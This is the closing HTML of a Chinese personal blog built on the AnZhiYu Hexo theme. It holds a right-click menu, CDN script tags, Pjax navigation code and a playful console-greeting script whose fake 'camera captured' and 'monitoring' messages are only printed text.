onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2020 By 安知鱼 V1.6.14",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Attackxu 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
